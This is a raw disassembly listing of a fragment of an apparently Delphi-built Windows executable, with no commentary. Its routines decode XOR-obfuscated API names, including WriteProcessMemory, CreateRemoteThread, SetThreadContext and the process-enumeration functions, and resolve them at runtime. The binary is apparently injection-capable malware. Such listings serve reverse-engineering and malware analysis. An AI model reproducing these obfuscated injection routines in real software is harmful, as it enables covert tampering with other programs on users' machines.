loc_409690:				; CODE XREF: sub_4092B0+414j
		mov	edx, [ebp+var_44]
		add	edx, edx
		lea	edx, [edx+edx*2]
		mov	ecx, [ebp+var_28]
		mov	ecx, [ecx+1Ch]
		mov	edx, [ecx+edx*8]
		mov	ecx, ebx
		add	ecx, ecx
		lea	ecx, [ecx+ecx*2]
		mov	edi, [ebp+var_28]
		mov	edi, [edi+1Ch]
		mov	ecx, [edi+ecx*8+4]
		inc	ecx
		cmp	edx, ecx
		jnz	short loc_4096C0
		mov	ebx, [ebp+var_44]
		mov	[ebp+var_45], 0
		jmp	short loc_4096C6
; ---------------------------------------------------------------------------

loc_4096C0:				; CODE XREF: sub_4092B0+405j
		inc	[ebp+var_44]
		dec	eax
		jnz	short loc_409690

loc_4096C6:				; CODE XREF: sub_4092B0+3D7j
					; sub_4092B0+40Ej
		cmp	[ebp+var_45], 0
		jz	loc_409630

loc_4096D0:				; CODE XREF: sub_4092B0+396j
					; sub_4092B0+3A7j ...
		cmp	esi, 6
		jl	loc_40977F
		mov	eax, [ebp+var_28]
		mov	byte ptr [eax+28h], 1
		mov	eax, [ebp+var_28]
		mov	eax, [eax+4]
		mov	[ebp+var_4C], eax

loc_4096E9:				; CODE XREF: sub_4092B0+490j
		lea	edx, [ebp+var_AC]
		mov	eax, [ebp+var_4C]
		call	sub_408610
		lea	esi, [ebp+var_AC]
		lea	edi, [ebp+var_6C]
		mov	ecx, 9
		rep movsd
		cmp	[ebp+var_67], 0
		jnz	short loc_409713
		cmp	[ebp+var_66], 0
		jz	short loc_409734

loc_409713:				; CODE XREF: sub_4092B0+45Bj
		cmp	[ebp+var_60], 0
		jnz	short loc_40971F
		cmp	[ebp+var_5C], 0
		jz	short loc_40972B

loc_40971F:				; CODE XREF: sub_4092B0+467j
		cmp	[ebp+var_54], 0
		jnz	short loc_409734
		cmp	[ebp+var_58], 4
		jge	short loc_409734

loc_40972B:				; CODE XREF: sub_4092B0+46Dj
		mov	eax, [ebp+var_28]
		mov	byte ptr [eax+28h], 0
		jmp	short loc_40977F
; ---------------------------------------------------------------------------

loc_409734:				; CODE XREF: sub_4092B0+461j
					; sub_4092B0+473j ...
		mov	eax, [ebp+var_28]
		mov	edx, [ebp+var_4C]
		sub	edx, [eax+4]
		cmp	edx, 6
		jb	short loc_4096E9
		jmp	short loc_40977F
; ---------------------------------------------------------------------------

loc_409744:				; CODE XREF: sub_4092B0+5Bj
					; sub_4092B0+68j
		mov	eax, [ebp+var_28]
		mov	byte ptr [eax],	0
		mov	eax, [ebp+var_28]
		mov	edx, [ebp+lpAddress]
		mov	[eax+10h], edx
		mov	eax, [ebp+var_28]
		mov	ebx, 57h
		mov	[eax+14h], ebx
		lea	edx, [ebp+var_B0]
		mov	eax, [ebp+var_28]
		mov	eax, ebx
		call	sub_406284
		mov	edx, [ebp+var_B0]
		mov	eax, [ebp+var_28]
		add	eax, 18h
		call	sub_4039E8

loc_40977F:				; CODE XREF: sub_4092B0+358j
					; sub_4092B0+423j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40979F

loc_40978C:				; CODE XREF: sub_4092B0+4EDj
		lea	eax, [ebp+var_B0]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_409798:				; DATA XREF: sub_4092B0+20o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40978C
; ---------------------------------------------------------------------------

loc_40979F:				; CODE XREF: sub_4092B0+4E7j
					; DATA XREF: sub_4092B0+4D7o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_4092B0	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Dh
dword_4097B0	dd 61766E49h, 2064696Ch, 65646F63h, 21h	; DATA XREF: sub_4092B0+34Eo

; =============== S U B	R O U T	I N E =======================================


sub_4097C0	proc near		; CODE XREF: sub_40AB44+3Bp
					; sub_40B410+B4p ...
		push	ebx
		push	esi
		mov	esi, edx
		mov	ebx, eax
		mov	ecx, esi
		xor	edx, edx
		mov	eax, ebx
		call	sub_4092B0
		pop	esi
		pop	ebx
		retn
sub_4097C0	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4097D4	proc near		; CODE XREF: sub_409880+34p
					; sub_40A478+48p ...

lpModuleName	= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	ebx
		xor	eax, eax
		push	ebp
		push	offset loc_409858
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	ds:dword_4176B0, 0
		jnz	short loc_409837
		lea	edx, [ebp+var_4]
		mov	eax, offset dword_409870
		call	sub_4064CC
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_409829
		lea	ecx, [ebp+lpModuleName]
		mov	dl, 1
		mov	eax, [ebp+var_4]
		call	sub_40653C
		mov	eax, [ebp+lpModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleW
		mov	ds:dword_4176B0, eax
		jmp	short loc_409837
; ---------------------------------------------------------------------------

loc_409829:				; CODE XREF: sub_4097D4+36j
		mov	eax, [ebp+var_4]
		push	eax		; lpModuleName
		call	GetModuleHandleA_0_0
		mov	ds:dword_4176B0, eax

loc_409837:				; CODE XREF: sub_4097D4+1Dj
					; sub_4097D4+53j
		mov	ebx, ds:dword_4176B0
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40985F

loc_40984A:				; CODE XREF: sub_4097D4+89j
		lea	eax, [ebp+lpModuleName]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_409858:				; DATA XREF: sub_4097D4+Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40984A
; ---------------------------------------------------------------------------

loc_40985F:				; CODE XREF: sub_4097D4+83j
					; DATA XREF: sub_4097D4+71o
		mov	eax, ebx
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_4097D4	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Ch
dword_409870	dd 3B27303Eh, 67663930h, 3939317Bh, 0 ;	DATA XREF: sub_4097D4+22o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409880	proc near		; CODE XREF: sub_409CC0+34p
					; sub_409DD4+Ep ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		xor	edx, edx
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_4098DC
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	edx, [ebp+var_8]
		mov	eax, [ebp+var_4]
		call	sub_4064CC
		mov	eax, [ebp+var_8]
		push	eax
		call	sub_4097D4
		pop	edx
		call	sub_406960
		mov	ebx, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4098E3

loc_4098CE:				; CODE XREF: sub_409880+61j
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_4098DC:				; DATA XREF: sub_409880+1Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4098CE
; ---------------------------------------------------------------------------

loc_4098E3:				; CODE XREF: sub_409880+5Bj
					; DATA XREF: sub_409880+49o
		mov	eax, ebx
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_409880	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_4098EC	proc near		; CODE XREF: sub_409978+2Bp
					; sub_409978+51p

var_8		= dword	ptr -8
lpModuleName	= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	ebx
		xor	eax, eax
		push	ebp
		push	offset loc_409954
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	ds:dword_4176B4, 0
		jnz	short loc_409933
		lea	edx, [ebp+var_8]
		mov	eax, offset dword_40996C
		call	sub_4064CC
		mov	eax, [ebp+var_8]
		lea	ecx, [ebp+lpModuleName]
		mov	dl, 1
		call	sub_40653C
		mov	eax, [ebp+lpModuleName]
		push	eax		; lpModuleName
		call	GetModuleHandleW
		mov	ds:dword_4176B4, eax

loc_409933:				; CODE XREF: sub_4098EC+1Dj
		mov	ebx, ds:dword_4176B4
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40995B

loc_409946:				; CODE XREF: sub_4098EC+6Dj
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_409954:				; DATA XREF: sub_4098EC+Bo
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_409946
; ---------------------------------------------------------------------------

loc_40995B:				; CODE XREF: sub_4098EC+67j
					; DATA XREF: sub_4098EC+55o
		mov	eax, ebx
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_4098EC	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 9
dword_40996C	dd 3931213Bh, 39317B39h, 39h ; DATA XREF: sub_4098EC+22o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409978	proc near		; CODE XREF: sub_40A0D4+184p
					; sub_40B410+576p ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		xor	edx, edx
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_4099F1
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	[ebp+var_4], 0
		jnz	short loc_4099BA
		call	sub_4098EC
		call	sub_4067D4
		test	eax, eax
		jz	short loc_4099B6
		lea	ebx, [eax+28h]
		jmp	short loc_4099D6
; ---------------------------------------------------------------------------

loc_4099B6:				; CODE XREF: sub_409978+37j
		xor	ebx, ebx
		jmp	short loc_4099D6
; ---------------------------------------------------------------------------

loc_4099BA:				; CODE XREF: sub_409978+29j
		lea	edx, [ebp+var_8]
		mov	eax, [ebp+var_4]
		call	sub_4064CC
		mov	eax, [ebp+var_8]
		push	eax
		call	sub_4098EC
		pop	edx
		call	sub_406960
		mov	ebx, eax

loc_4099D6:				; CODE XREF: sub_409978+3Cj
					; sub_409978+40j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4099F8

loc_4099E3:				; CODE XREF: sub_409978+7Ej
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_4099F1:				; DATA XREF: sub_409978+1Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4099E3
; ---------------------------------------------------------------------------

loc_4099F8:				; CODE XREF: sub_409978+78j
					; DATA XREF: sub_409978+66o
		mov	eax, ebx
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn
sub_409978	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_409A00	proc near		; CODE XREF: sub_409A8C+40p
					; sub_409A8C+54p ...

Buffer		= _MEMORY_BASIC_INFORMATION ptr	-134h
Filename	= byte ptr -118h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFEDCh
		mov	ebp, ecx
		mov	esi, edx
		mov	edi, eax
		xor	ebx, ebx
		push	1Ch		; dwLength
		lea	eax, [esp+138h+Buffer]
		push	eax		; lpBuffer
		push	edi		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jnz	short loc_409A7C
		cmp	[esp+134h+Buffer.State], 1000h
		jnz	short loc_409A7C
		cmp	[esp+134h+Buffer.AllocationBase], 0
		jz	short loc_409A7C
		push	104h		; nSize
		lea	eax, [esp+138h+Filename]
		push	eax		; lpFilename
		mov	eax, [esp+13Ch+Buffer.AllocationBase]
		push	eax		; hModule
		call	GetModuleFileNameA_0
		test	eax, eax
		jz	short loc_409A7C
		mov	eax, [esp+134h+Buffer.AllocationBase]
		mov	[esi], eax
		mov	eax, [esi]
		cmp	word ptr [eax],	5A4Dh
		jnz	short loc_409A7C
		mov	eax, [esi]
		mov	edx, [esi]
		add	edx, 3Ch
		add	eax, [edx]
		cmp	dword ptr [eax], 4550h
		jnz	short loc_409A7C
		mov	edx, [esi]
		add	edx, [eax+78h]
		mov	[ebp+0], edx
		cmp	dword ptr [ebp+0], 0
		setnz	bl

loc_409A7C:				; CODE XREF: sub_409A00+22j
					; sub_409A00+2Cj ...
		mov	eax, ebx
		add	esp, 124h
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_409A00	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_409A8C	proc near		; CODE XREF: sub_40AB44+14Cp
					; sub_40AB44+189p ...

var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= byte ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		add	esp, 0FFFFFFF4h
		mov	ebx, eax
		mov	esi, ebx
		test	ebx, ebx
		jz	short loc_409B10
		push	0
		lea	edx, [esp+20h+var_14]
		mov	ecx, 1
		mov	eax, ebx
		call	sub_409CC0
		test	al, al
		jz	short loc_409B10
		cmp	[esp+1Ch+var_14], 68h
		jnz	short loc_409B10
		call	GetVersion_0
		test	eax, 80000000h
		jz	short loc_409B10
		lea	ecx, [esp+1Ch+var_18]
		mov	edx, esp
		mov	eax, ebx
		call	sub_409A00
		test	al, al
		jnz	short loc_409B10
		inc	ebx
		mov	ebx, [ebx]
		lea	ecx, [esp+1Ch+var_18]
		mov	edx, esp
		mov	eax, ebx
		call	sub_409A00
		test	al, al
		jz	short loc_409B10
		mov	edi, [esp+1Ch+var_18]
		mov	eax, [edi+14h]
		dec	eax
		test	eax, eax
		jl	short loc_409B10
		inc	eax
		xor	edx, edx

loc_409AF8:				; CODE XREF: sub_409A8C+82j
		mov	ecx, [edi+1Ch]
		add	ecx, [esp+1Ch+var_1C]
		mov	ebp, [ecx+edx*4]
		add	ebp, [esp+1Ch+var_1C]
		cmp	ebp, ebx
		jnz	short loc_409B0C
		mov	esi, ebx
		jmp	short loc_409B10
; ---------------------------------------------------------------------------

loc_409B0C:				; CODE XREF: sub_409A8C+7Aj
		inc	edx
		dec	eax
		jnz	short loc_409AF8

loc_409B10:				; CODE XREF: sub_409A8C+Dj
					; sub_409A8C+23j ...
		mov	eax, esi
		add	esp, 0Ch
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_409A8C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_409B1C	proc near		; CODE XREF: sub_409B20+1Bp
					; sub_409B20+69p
		mov	eax, fs:[eax]
		retn
sub_409B1C	endp


; =============== S U B	R O U T	I N E =======================================


sub_409B20	proc near		; CODE XREF: sub_409BE8+9p
					; sub_40B294+39p ...

var_8		= dword	ptr -8

		push	ebx
		push	ecx
		cmp	ds:byte_416920,	0
		jnz	loc_409BDF
		mov	ds:byte_416920,	1
		mov	eax, 18h
		call	sub_409B1C
		mov	ebx, eax
		sub	ebx, 10h
		call	GetCurrentThreadId_0
		xor	ebx, eax
		mov	ds:dword_416918, ebx
		push	0
		call	GetCurrentThreadId_0
		xor	eax, ds:dword_416918
		add	eax, 8
		lea	edx, [esp+0Ch+var_8]
		mov	ecx, 4
		call	sub_409CC0
		test	al, al
		jz	short loc_409B84
		call	GetCurrentProcessId
		xor	eax, ds:dword_416918
		cmp	eax, [esp+8+var_8]
		jz	short loc_409BD8

loc_409B84:				; CODE XREF: sub_409B20+52j
		mov	eax, 30h
		call	sub_409B1C
		mov	ebx, eax
		call	GetCurrentProcessId
		xor	ebx, eax
		mov	ds:dword_416918, ebx
		push	0
		call	GetCurrentThreadId_0
		xor	eax, ds:dword_416918
		add	eax, 38h
		lea	edx, [esp+0Ch+var_8]
		mov	ecx, 4
		call	sub_409CC0
		test	al, al
		jz	short loc_409BCF
		call	GetCurrentProcessId
		xor	eax, ds:dword_416918
		cmp	eax, [esp+8+var_8]
		jz	short loc_409BDF

loc_409BCF:				; CODE XREF: sub_409B20+9Dj
		xor	eax, eax
		mov	ds:dword_416918, eax
		jmp	short loc_409BDF
; ---------------------------------------------------------------------------

loc_409BD8:				; CODE XREF: sub_409B20+62j
		mov	ds:byte_41691C,	1

loc_409BDF:				; CODE XREF: sub_409B20+9j
					; sub_409B20+ADj ...
		mov	eax, ds:dword_416918
		pop	edx
		pop	ebx
		retn
sub_409B20	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_409BE8	proc near		; CODE XREF: sub_40BB64+5Bp
		cmp	ds:byte_416920,	0
		jnz	short loc_409BF6
		call	sub_409B20

loc_409BF6:				; CODE XREF: sub_409BE8+7j
		mov	al, ds:byte_41691C
		retn
sub_409BE8	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409BFC	proc near		; CODE XREF: sub_409CC0+1Dp

var_C		= dword	ptr -0Ch
var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF4h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], edx
		mov	esi, eax
		mov	[ebp+var_5], 0
		xor	ebx, ebx
		push	ebp
		push	offset loc_409CA9
		push	dword ptr fs:[ebx]
		mov	fs:[ebx], esp
		mov	eax, [esi]
		call	sub_40455C
		mov	[ebp+var_C], eax
		mov	eax, [ebp+var_C]
		sar	eax, 1
		jns	short loc_409C30
		adc	eax, 0

loc_409C30:				; CODE XREF: sub_409BFC+2Fj
		lea	edx, [eax+2]
		sar	edx, 1
		jns	short loc_409C3A
		adc	edx, 0

loc_409C3A:				; CODE XREF: sub_409BFC+39j
		xor	ecx, ecx
		test	edx, edx
		jle	short loc_409C9F

loc_409C40:				; CODE XREF: sub_409BFC+A1j
		lea	ebx, [eax+eax*2]
		mov	edi, [esi]
		mov	ebx, [edi+ebx*4]
		cmp	ebx, [ebp+var_4]
		jbe	short loc_409C57
		sub	eax, edx
		test	eax, eax
		jge	short loc_409C86
		xor	eax, eax
		jmp	short loc_409C86
; ---------------------------------------------------------------------------

loc_409C57:				; CODE XREF: sub_409BFC+4Fj
		lea	ebx, [eax+eax*2]
		mov	edi, [esi]
		mov	ebx, [edi+ebx*4+4]
		cmp	ebx, [ebp+var_4]
		jbe	short loc_409C7B
		lea	eax, [eax+eax*2]
		mov	edx, [esi]
		mov	al, [edx+eax*4+8]
		mov	[ebp+var_5], al
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_409CB3
; ---------------------------------------------------------------------------

loc_409C7B:				; CODE XREF: sub_409BFC+67j
		add	eax, edx
		cmp	eax, [ebp+var_C]
		jl	short loc_409C86
		mov	eax, [ebp+var_C]
		dec	eax

loc_409C86:				; CODE XREF: sub_409BFC+55j
					; sub_409BFC+59j ...
		test	cl, cl
		jnz	short loc_409C9F
		cmp	edx, 1
		jnz	short loc_409C93
		mov	cl, 1
		jmp	short loc_409C9B
; ---------------------------------------------------------------------------

loc_409C93:				; CODE XREF: sub_409BFC+91j
		inc	edx
		sar	edx, 1
		jns	short loc_409C9B
		adc	edx, 0

loc_409C9B:				; CODE XREF: sub_409BFC+95j
					; sub_409BFC+9Aj
		test	edx, edx
		jg	short loc_409C40

loc_409C9F:				; CODE XREF: sub_409BFC+42j
					; sub_409BFC+8Cj
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_409CB3
; ---------------------------------------------------------------------------

loc_409CA9:				; DATA XREF: sub_409BFC+15o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_409CB3:				; CODE XREF: sub_409BFC+7Dj
					; sub_409BFC+ABj
		mov	al, [ebp+var_5]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_409BFC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409CC0	proc near		; CODE XREF: sub_407BF8+150p
					; sub_407BF8+203p ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		push	esi
		push	edi
		mov	esi, ecx
		mov	[ebp+var_4], edx
		mov	ebx, eax
		mov	edi, [ebp+arg_0]
		test	edi, edi
		jz	short loc_409CE6
		mov	ecx, esi
		mov	edx, ebx
		mov	eax, edi
		call	sub_409BFC
		test	al, al
		jz	short loc_409D29

loc_409CE6:				; CODE XREF: sub_409CC0+15j
		cmp	ds:dword_416924, 0
		jnz	short loc_409CFE
		mov	eax, offset dword_409D3C
		call	sub_409880
		mov	ds:dword_416924, eax

loc_409CFE:				; CODE XREF: sub_409CC0+2Dj
		test	ebx, ebx
		jz	short loc_409D21
		lea	eax, [ebp+var_8]
		push	eax
		push	esi
		mov	eax, [ebp+var_4]
		push	eax
		push	ebx
		call	GetCurrentProcess
		push	eax
		call	ds:dword_416924
		test	eax, eax
		jz	short loc_409D21
		cmp	esi, [ebp+var_8]
		jz	short loc_409D25

loc_409D21:				; CODE XREF: sub_409CC0+40j
					; sub_409CC0+5Aj
		xor	eax, eax
		jmp	short loc_409D2B
; ---------------------------------------------------------------------------

loc_409D25:				; CODE XREF: sub_409CC0+5Fj
		mov	al, 1
		jmp	short loc_409D2B
; ---------------------------------------------------------------------------

loc_409D29:				; CODE XREF: sub_409CC0+24j
		xor	eax, eax

loc_409D2B:				; CODE XREF: sub_409CC0+63j
					; sub_409CC0+67j
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn	4
sub_409CC0	endp

; ---------------------------------------------------------------------------
		dd 0FFFFFFFFh, 11h
dword_409D3C	dd 31343007h, 363A2705h, 18262630h, 273A3830h, 2Ch
					; DATA XREF: sub_409CC0+2Fo

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_409D50	proc near		; DATA XREF: CODE:00415BC0o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_409D75
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_4176AC
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_409D7C

loc_409D74:				; CODE XREF: sub_409D50+2Aj
		retn
; ---------------------------------------------------------------------------

loc_409D75:				; DATA XREF: sub_409D50+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_409D74
; ---------------------------------------------------------------------------

loc_409D7C:				; CODE XREF: sub_409D50:loc_409D74j
					; DATA XREF: sub_409D50+1Fo
		pop	ebp
		retn
sub_409D50	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_409D80	proc near		; DATA XREF: CODE:00415BBCo
		sub	ds:dword_4176AC, 1
		retn
sub_409D80	endp

; ---------------------------------------------------------------------------
off_409D88	dd offset dword_409D8C	; DATA XREF: CODE:00409DBCo
					; CODE:00409DC4o
dword_409D8C	dd 312E020Eh, 10h, 2	; DATA XREF: CODE:off_409D88o
		dd offset off_401018
		dd 4
		dd offset off_401018
		dd 0Ch
off_409DA8	dd offset dword_409DAC	; DATA XREF: sub_409F94+52r
					; sub_409F94+76r ...
dword_409DAC	dd 44540A11h, 6F725041h, 73736563h, 10h	; DATA XREF: CODE:off_409DA8o
		dd offset off_409D88
		dd 0FFFFFFFFh
		dd offset off_409D88
		dd 64616D09h, 6F6D6552h, 0C08B6574h

; =============== S U B	R O U T	I N E =======================================


sub_409DD4	proc near		; CODE XREF: sub_40A0D4:loc_40A33Dp
					; sub_40D1F8+1E4p
		cmp	ds:dword_416928, 0
		jnz	short locret_409E28
		mov	eax, offset dword_409E34
		call	sub_409880
		mov	ds:dword_416938, eax
		mov	eax, offset dword_409E58
		call	sub_409880
		mov	ds:dword_416928, eax
		mov	eax, offset dword_409E70
		call	sub_409880
		mov	ds:dword_41692C, eax
		mov	eax, offset dword_409E88
		call	sub_409880
		mov	ds:dword_416930, eax
		mov	eax, offset dword_409EA0
		call	sub_409880
		mov	ds:dword_416934, eax

locret_409E28:				; CODE XREF: sub_409DD4+7j
		retn
sub_409DD4	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 18h
dword_409E34	dd 34302716h, 3A013021h, 303D393Ah, 67662539h, 25343B06h
					; DATA XREF: sub_409DD4+9o
		dd 213A3D26h, 0
		dd 0FFFFFFFFh, 0Eh
dword_409E58	dd 363A2705h, 66262630h, 273C1367h, 2126h, 0FFFFFFFFh
					; DATA XREF: sub_409DD4+18o
		dd 0Dh
dword_409E70	dd 363A2705h, 66262630h, 2D301B67h, 21h, 0FFFFFFFFh, 0Dh
					; DATA XREF: sub_409DD4+27o
dword_409E88	dd 20313A18h, 67663039h, 26273C13h, 21h, 0FFFFFFFFh, 0Ch
					; DATA XREF: sub_409DD4+36o
dword_409EA0	dd 20313A18h, 67663039h, 212D301Bh, 0 ;	DATA XREF: sub_409DD4+45o

; =============== S U B	R O U T	I N E =======================================


sub_409EB0	proc near		; CODE XREF: sub_40AB44:loc_40AD10p
					; sub_40B410:loc_40B95Bp
		cmp	ds:dword_416954, 0
		jnz	short locret_409F04
		mov	eax, offset dword_409F10
		call	sub_409880
		mov	ds:dword_416954, eax
		mov	eax, offset dword_409F2C
		call	sub_409880
		mov	ds:dword_416958, eax
		mov	eax, offset dword_409F48
		call	sub_409880
		mov	ds:dword_41695C, eax
		mov	eax, offset dword_409F64
		call	sub_409880
		mov	ds:dword_416960, eax
		mov	eax, offset dword_409F80
		call	sub_409880
		mov	ds:dword_416964, eax

locret_409F04:				; CODE XREF: sub_409EB0+7j
		retn
sub_409EB0	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 11h
dword_409F10	dd 31343007h, 363A2705h, 18262630h, 273A3830h, 2Ch, 0FFFFFFFFh
					; DATA XREF: sub_409EB0+9o
		dd 12h
dword_409F2C	dd 213C2702h, 3A270530h, 26263036h, 3A383018h, 2C27h, 0FFFFFFFFh
					; DATA XREF: sub_409EB0+18o
		dd 10h
dword_409F48	dd 1213012h, 3430273Dh,	3B3A1631h, 212D3021h, 0	; DATA XREF: sub_409EB0+27o
		dd 0FFFFFFFFh, 10h
dword_409F64	dd 1213006h, 3430273Dh,	3B3A1631h, 212D3021h, 0	; DATA XREF: sub_409EB0+36o
		dd 0FFFFFFFFh, 12h
dword_409F80	dd 34302716h, 30073021h, 30213A38h, 30273D01h, 3134h
					; DATA XREF: sub_409EB0+45o

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

; int __stdcall	sub_409F94(PSID	pSid)
sub_409F94	proc near		; CODE XREF: sub_40A0D4+13Dp
					; sub_40A0D4+15Dp ...

var_4		= dword	ptr -4
pSid		= dword	ptr  8
arg_4		= dword	ptr  0Ch

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], ecx
		mov	edi, edx
		mov	ebx, eax
		mov	esi, [ebp+pSid]
		mov	eax, [ebp+var_4]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_40A0C3
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-4]
		mov	eax, [eax]
		call	sub_40455C
		mov	edx, [ebp+arg_4]
		cmp	eax, [edx-8]
		jnz	short loc_40A018
		mov	eax, [ebp+arg_4]
		cmp	dword ptr [eax-8], 0
		jnz	short loc_409FF6
		push	40h
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-4]
		mov	ecx, 1
		mov	edx, off_409DA8
		call	sub_404718
		add	esp, 4
		jmp	short loc_40A018
; ---------------------------------------------------------------------------

loc_409FF6:				; CODE XREF: sub_409F94+43j
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-8]
		add	eax, eax
		push	eax
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-4]
		mov	ecx, 1
		mov	edx, off_409DA8
		call	sub_404718
		add	esp, 4

loc_40A018:				; CODE XREF: sub_409F94+3Aj
					; sub_409F94+60j
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-8]
		add	eax, eax
		mov	edx, [ebp+arg_4]
		mov	edx, [edx-4]
		mov	edx, [edx]
		mov	[edx+eax*8], ebx
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-8]
		add	eax, eax
		mov	edx, [ebp+arg_4]
		mov	edx, [edx-4]
		mov	edx, [edx]
		lea	eax, [edx+eax*8+4]
		mov	edx, [ebp+var_4]
		call	sub_4039E8
		mov	eax, [ebp+arg_4]
		mov	eax, [eax-8]
		add	eax, eax
		mov	edx, [ebp+arg_4]
		mov	edx, [edx-4]
		mov	edx, [edx]
		mov	[edx+eax*8+8], edi
		test	esi, esi
		jz	short loc_40A069
		push	esi		; pSid
		call	GetLengthSid
		mov	ebx, eax
		jmp	short loc_40A06B
; ---------------------------------------------------------------------------

loc_40A069:				; CODE XREF: sub_409F94+C9j
		xor	ebx, ebx

